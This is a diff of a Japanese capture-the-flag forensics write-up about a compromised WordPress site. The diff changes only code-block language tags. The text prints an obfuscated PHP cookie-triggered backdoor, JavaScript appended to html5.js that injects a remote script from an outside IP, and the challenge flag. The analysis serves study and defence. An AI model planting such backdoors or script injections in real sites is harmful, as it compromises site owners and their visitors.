@@ -87,7 +87,7 @@ Answer: Those Fluffy Bunnies Make Tummy Bumpy
 
 アクセスログから/wp-content/uploads/wysija/themes/weblizer/template.phpというのにアクセスしていることがわかったので、そのファイルを見てみます。中身は次のようなPHPファイルです。
 
-```
+```php
 <?php
 $hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
 $andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
@@ -112,7 +112,7 @@ $xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
 
 というコードです。`create_function`で関数化されたコードは次のコードです（実際の出力を整形しています）
 
-```
+```php
 $c='count';
 $a=$_COOKIE;
 if (reset($a) == 'ha' && $c($a) > 3) {
@@ -137,13 +137,13 @@ Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-Wo
 
 それはともかく/wp-content/themes/twentythirteen/js/html5.jsを見てみます。先頭のコメントにHTML5 Shivとあります。バージョンは3.7.0。[HTML5Shivのリポジトリ](https://github.com/aFarkas/html5shiv)から3.7.0のファイルをダウンロードし、このファイルとの差異を探すと、末尾に次のコードが追加されていました。
 
-```
+```js
 var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i<f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i<c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("<"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'>\</"+m+"\>");
 ```
 
 [beautify](http://jsbeautifier.org/)してみます。
 
-```
+```js
 var g = "ti";
 var c = "HTML Tags";
 var f = ". li colgroup br src datalist script option .";
@@ -178,20 +178,20 @@ document.write("<" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "
 
 このコードをnodeに与えて、`document.write`の引数になっている文字列を見てみると次のようになります。
 
-```
+```html
 <script src='http://128.238.66.100/analytics.js'></script>
 ```
 
 つまりhtml5.jsが実行されると'http://128.238.66.100/analytics.js'が読まれて実行されるわけです。ここにアクセスしてanalytics.jsを見てみます（長いので中身は省略します）。すると、明らかにおかしな箇所がありました。
 
-```
+```js
 var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
 window[_0x91fe[2]](_0x91fe[0], _0x91fe[1]);
 ```
 
 `_0x91fe`に代入している箇所をnodeに与えて中身を見てみます。
 
-```
+```js
 > var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
 undefined
 > _0x91fe
@@ -206,13 +206,13 @@ undefined
 
 ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として'stream_{1,2,3,8}.dmp'の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると'stream_8.dmp'に何か書かれています。
 
-```
+```js
 var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
 ```
 
 JavaScriptっぽいのでnodeに与えてみます。
 
-```
+```js
 > var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
 undefined
 > _0xee0b
